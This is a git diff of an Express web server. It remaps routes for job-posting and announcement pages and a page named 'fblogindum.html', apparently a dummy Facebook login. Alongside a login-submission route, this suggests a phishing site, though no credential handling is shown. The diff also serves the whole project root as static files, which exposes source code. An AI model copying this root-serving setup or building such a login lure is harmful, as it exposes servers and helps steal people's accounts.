@@ -8,7 +8,7 @@ const PORT = process.env.PORT || 3000; // Use Render's PORT environment variable
 
 // Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static('public')); // Serve static files from the "public" directory
+app.use(express.static(__dirname)); // Serve static files from the "public" directory
 
 // Route to handle login form submission
 app.post('/submit-login', (req, res) => {
@@ -27,16 +27,16 @@ app.post('/submit-login', (req, res) => {
 
 // Route to serve the homepage
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'Home.html')); 
 });
-app.get('/Home.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Home.html')); // Change 'index.html' to your main HTML file name
+app.get('/Job Postings.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'Job Postings.html')); 
 });
 app.get('/Announcements.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Announcements.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'Announcements.html')); 
 });
 app.get('/public/fblogindum.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'fblogindum.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'fblogindum.html'));
 });
 
 // Start the server
